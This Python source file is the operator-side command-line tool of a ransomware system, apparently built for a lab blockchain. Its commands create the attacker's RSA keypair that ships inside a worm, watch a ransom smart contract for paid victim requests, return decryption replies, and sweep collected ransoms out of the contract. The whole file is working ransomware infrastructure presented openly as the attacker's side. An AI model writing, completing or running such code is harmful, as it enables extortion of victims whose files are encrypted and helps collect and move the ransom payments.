"""The attacker's side: create the keys, answer paid requests, take the money.

These commands run on the attacker's machine, which is where the worm was
launched from. Two keys live there and never leave it:

  attacker_keys.json   the RSA keypair: the public half travels inside the
                       worm, the private half opens the victims' sealed keys
  chain_key.json       the account that deployed the ransom contract, so the
                       only account the contract lets answer requests
"""

import argparse
import json
from pathlib import Path

from eth_abi import decode as abi_decode
from eth_utils import keccak

from . import chain, keys, paths, wallet


def load_config() -> dict:
    if not paths.OPERATOR_CHAIN.exists():
        raise ValueError(f"no chain config here ({paths.OPERATOR_CHAIN}): "
                         "this is not the attacker's machine")
    return keys.read_json(paths.OPERATOR_CHAIN)


def init():
    """Create the attacker's RSA keypair. Runs when the attacker machine boots."""
    if paths.ATTACKER_KEYS.exists():
        print(f"attacker keys already exist: {paths.ATTACKER_KEYS}")
        return
    keys.create_attacker_keys(paths.ATTACKER_KEYS)


def watch() -> list:
    """Answer every paid, unanswered request on the chain."""
    answered = chain.attacker_watch(load_config(), paths.ATTACKER_KEYS, paths.CHAIN_KEY)
    if answered:
        for entry in answered:
            print(f"answered request {entry['id']}  (transaction {entry['transaction_hash']})")
    else:
        print("no unanswered requests")
    return answered


def withdraw() -> str:
    """Sweep the collected ransoms out of the contract."""
    tx_hash = chain.withdraw(load_config(), paths.CHAIN_KEY)
    print(f"ransoms swept: {tx_hash}")
    return tx_hash


def reply(request_path) -> dict:
    """The manual path: turn a saved request into the reply the victim needs."""
    attacker_keys = keys.read_json(paths.ATTACKER_KEYS)
    request = keys.read_json(request_path)
    reply = keys.attacker_build_reply(keys.attacker_open_request(attacker_keys, request))
    print(json.dumps(reply, indent=2))
    return reply


def status():
    """One read-only look at the attacker's side of the chain."""
    config = load_config()
    print(f"chain:    {config['rpc_url']} (chain {config['chain_id']})")
    if not paths.ATTACKER_KEYS.exists():
        print("keys:     no attacker keys yet (run: ransom init)")
    else:
        print(f"keys:     {paths.ATTACKER_KEYS}")
    contract = chain.discover_contract(config)
    print(f"contract: {contract}")
    account = chain.load_chain_key(paths.CHAIN_KEY)
    print(f"account:  {account.address} ({wallet.format_ether(wallet.balance_wei(config, account.address))} lab ETH)")
    data = "0x" + keccak(text="attacker()")[:4].hex()
    raw = wallet.rpc(config, "eth_call", [{"to": contract, "data": data}, "latest"])
    onchain = abi_decode(["address"], bytes.fromhex(raw[2:]))[0]
    print(f"contract's attacker: {onchain}  "
          f"{'(this account)' if onchain.lower() == account.address.lower() else '(NOT this account)'}")
    requests = chain.poll_requests(config)
    print(f"requests: {len(requests)} on chain, "
          f"{sum(1 for entry in requests if entry['answered'])} answered")


def main(argv) -> int:
    parser = argparse.ArgumentParser(prog="ransom", description=__doc__.split("\n\n")[0])
    commands = parser.add_subparsers(dest="command", required=True)
    commands.add_parser("init", help="create the attacker's RSA keypair")
    commands.add_parser("watch", help="answer every paid, unanswered request")
    commands.add_parser("withdraw", help="sweep the collected ransoms")
    commands.add_parser("status", help="one read-only look at this side")
    manual = commands.add_parser("reply", help="manual path: turn a saved request into a reply")
    manual.add_argument("--request", type=Path, required=True)
    args = parser.parse_args(argv)
    {"init": init, "watch": watch, "withdraw": withdraw, "status": status,
     "reply": lambda: reply(args.request)}[args.command]()
    return 0
